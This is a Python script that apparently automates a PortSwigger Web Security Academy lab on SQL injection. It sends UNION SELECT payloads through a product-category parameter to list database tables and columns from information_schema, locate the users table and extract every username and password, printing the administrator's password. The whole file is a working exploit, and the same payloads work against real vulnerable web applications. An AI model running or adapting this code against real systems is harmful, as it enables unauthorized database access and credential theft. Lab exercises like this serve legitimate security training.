import sys
from urllib.parse import quote_plus
import requests
from bs4 import BeautifulSoup


def request(base, sql_query=''):
    payload = f'{quote_plus(sql_query)}--' if sql_query else ''
    response = requests.get(f"{base}/filter?category=Gifts'{payload}", timeout=3)
    return BeautifulSoup(response.text, 'html.parser')


BASE_URL = input('Enter lab URL (e.g. 000000a0000b000c00.web-security-academy.net): ').rstrip('/')
soup = request(BASE_URL)

if soup.title.string != 'SQL injection attack, listing the database contents on non-Oracle databases':
    print('Page title mismatch!')
    sys.exit(1)

soup = request(BASE_URL, ' UNION SELECT table_name, NULL FROM information_schema.tables')
table_name = soup.select_one('th:-soup-contains("users_")').text
print('Users table name is', table_name)

soup = request(BASE_URL, (' UNION SELECT column_name, data_type FROM information_schema.columns '
                          f"WHERE table_name='{table_name}'"))
username_column_name = soup.select_one('th:-soup-contains("username_")').text
password_column_name = soup.select_one('th:-soup-contains("password_")').text

print('Username column name is', username_column_name)
print('Password column name is', password_column_name)

soup = request(BASE_URL, f" UNION SELECT {username_column_name}, {password_column_name} FROM {table_name}")
admin_password = soup.select_one('tr:has(th:-soup-contains("administrator")) td').text
print('Admin password is', admin_password)
